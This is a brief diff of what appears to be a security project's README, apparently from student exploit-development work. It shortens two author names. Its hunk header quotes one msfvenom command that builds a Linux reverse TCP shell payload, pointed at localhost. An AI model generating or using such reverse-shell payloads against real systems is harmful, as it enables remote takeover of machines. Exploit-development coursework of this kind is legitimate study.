@@ -143,9 +143,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw -b "\x0
 
 ## Authors
 
-Alexander-OS3
+Alexander
 
-Jelle-OS3
+Jelle
 
 ## TO-DO
 
